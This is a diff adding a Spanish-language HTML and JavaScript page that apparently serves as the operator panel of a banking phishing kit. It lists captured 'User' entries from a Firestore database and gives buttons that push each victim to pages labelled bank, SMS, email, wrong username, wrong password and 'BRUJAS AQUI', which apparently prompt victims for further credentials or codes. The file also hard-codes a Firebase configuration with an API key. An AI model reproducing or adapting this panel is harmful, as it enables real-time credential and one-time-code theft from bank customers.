@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
+      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
+      crossorigin="anonymous"
+    />
+    <title>Control de Calidad</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        padding: 20px;
+      }
+
+      #data {
+        margin-top: 20px;
+      }
+
+      .document {
+        border: 1px solid #ccc;
+        padding: 10px;
+        margin-bottom: 10px;
+      }
+
+      .document p {
+        margin: 5px 0;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="container">
+      <h1 class="text-center my-4">🛜Panel🛜</h1>
+      <div id="data" class="row"></div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
+    <script>
+      // Configuración de Firebase
+      const firebaseConfig = {
+  apiKey: "AIzaSyAExg896HFu93msNgwlazYfaTfcSp9Mo9Y",
+  authDomain: "prrrr-cb4d7.firebaseapp.com",
+  projectId: "prrrr-cb4d7",
+  storageBucket: "prrrr-cb4d7.firebasestorage.app",
+  messagingSenderId: "881373224030",
+  appId: "1:881373224030:web:2be20f6fbcb19a03bfa8cf"
+};
+
+      // Inicializar Firebase
+      firebase.initializeApp(firebaseConfig);
+      const db = firebase.firestore();
+
+      // Función para mostrar los datos
+      function displayData(docs) {
+        const dataDiv = document.getElementById("data");
+        dataDiv.innerHTML = "";
+
+        docs.forEach((doc) => {
+          console.log(doc.id);
+          const docDiv = document.createElement("div");
+          docDiv.className = "col-md-4 document";
+          docDiv.innerHTML = `
+          <div class="card">
+            <div class="card-body">
+              <h5 class="card-title"><strong>User:</strong> ${doc.id}</h5>
+              <button class="btn btn-danger btn-sm mt-3" onclick="deleteDocument('${
+                doc.id
+              }')">Eliminar</button>
+			  <button class="btn btn-success btn-sm mt-3" onclick="changePageToBco('${
+                doc.id
+              }')">Mandarlo Al Bco</button>
+              <button class="btn btn-secondary btn-sm mt-3" onclick="changePageToTwo('${
+                doc.id
+              }')">SMS</button>
+
+              <button class="btn btn-secondary btn-sm mt-3" onclick="changePageToThree('${
+                doc.id
+              }')">Correo</button>
+              
+              <button class="btn btn-secondary btn-sm mt-3" onclick="changePaget('${
+                doc.id
+              }')">Lo regresa al inicio</button>
+			  <button class="btn btn-secondary btn-sm mt-3" onclick="changePageToUserinco('${
+                doc.id
+              }')">Usuario Incorrecto</button>
+			  <button class="btn btn-secondary btn-sm mt-3" onclick="changePageToContraincoo('${
+                doc.id
+              }')">Clave Incorrecta</button>
+			  <button class="btn btn-danger btn-sm mt-3" onclick="changePageToSapito('${
+                doc.id
+              }')">BRUJAS AQUI</button>
+            </div>
+          </div>
+        `;
+          dataDiv.appendChild(docDiv);
+        });
+      }
+
+      // Obtener datos de Firestore
+      db.collection("prolme").onSnapshot((snapshot) => {
+        const docs = snapshot.docs;
+        displayData(docs);
+      });
+
+      // Función para actualizar el documento
+      function updateDocument(id) {
+        db.collection("prolme")
+          .doc(id)
+          .then(() => {
+            console.log("Documento actualizado con ID: ", id);
+          })
+          .catch((error) => {
+            console.error("Error actualizando el documento: ", error);
+          });
+      }
+
+      // Función para eliminar el documento
+      function deleteDocument(id) {
+        db.collection("prolme")
+          .doc(id)
+          .delete()
+          .then(() => {
+            console.log("Documento eliminado con ID: ", id);
+          })
+          .catch((error) => {
+            console.error("Error eliminando el documento: ", error);
+          });
+      }
+
+      // Función para cambiar la página a 2  changePaget
+      function changePageToTwo(id) {
+        db.collection("prolme")
+          .doc(id)
+          .update({
+            page: 3,
+          })
+          .then(() => {
+            console.log("Página cambiada a 2 para el documento con ID: ", id);
+          })
+          .catch((error) => {
+            console.error("Error cambiando la página: ", error);
+          });
+      }
+	  
+	  // Función para cambiar la página a 6  changePageToUserinco
+      function changePageToUserinco(id) {
+        db.collection("prolme")
+          .doc(id)
+          .update({
+            page: 6,
+          })
+          .then(() => {
+            console.log("Página cambiada a 2 para el documento con ID: ", id);
+          })
+          .catch((error) => {
+            console.error("Error cambiando la página: ", error);
+          });
+      }
+	  
+	  // Función para cambiar la página a 7  changePageToContraincoo
+      function changePageToContraincoo(id) {
+        db.collection("prolme")
+          .doc(id)
+          .update({
+            page: 7,
+          })
+          .then(() => {
+            console.log("Página cambiada a 2 para el documento con ID: ", id);
+          })
+          .catch((error) => {
+            console.error("Error cambiando la página: ", error);
+          });
+      }
+	  
+	  // Función para cambiar la página a 8  changePageToSapito
+      function changePageToSapito(id) {
+        db.collection("prolme")
+          .doc(id)
+          .update({
+            page: 8,
+          })
+          .then(() => {
+            console.log("Página cambiada a 2 para el documento con ID: ", id);
+          })
+          .catch((error) => {
+            console.error("Error cambiando la página: ", error);
+          });
+      }
+	  
+	        // Función para cambiar bco
+      function changePageToBco(id) {
+        db.collection("prolme")
+          .doc(id)
+          .update({
+            page: 2,
+          })
+          .then(() => {
+            console.log("Página cambiada a 2 para el documento con ID: ", id);
+          })
+          .catch((error) => {
+            console.error("Error cambiando la página: ", error);
+          });
+      }
+
+      function changePageToThree(id) {
+        db.collection("prolme")
+          .doc(id)
+          .update({
+            page: 5,
+          })
+          .then(() => {
+            console.log("Página cambiada a 2 para el documento con ID: ", id);
+          })
+          .catch((error) => {
+            console.error("Error cambiando la página: ", error);
+          });
+      }
+
+      function changePaget(id) {
+        db.collection("prolme")
+          .doc(id)
+          .update({
+            page: 4,
+          })
+          .then(() => {
+            console.log("Página cambiada a 1 para el documento con ID: ", id);
+          })
+          .catch((error) => {
+            console.error("Error cambiando la página: ", error);
+          });
+      }
+      function changePageToContra(id) {
+        db.collection("prolme")
+          .doc(id)
+          .update({
+            page: 4,
+          })
+          .then(() => {
+            console.log("Página cambiada a 1 para el documento con ID: ", id);
+          })
+          .catch((error) => {
+            console.error("Error cambiando la página: ", error);
+          });
+      }
+    </script>
+    <script
+      src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+      integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
+      integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
+      integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+      crossorigin="anonymous"
+    ></script>
+  </body>
+</html>
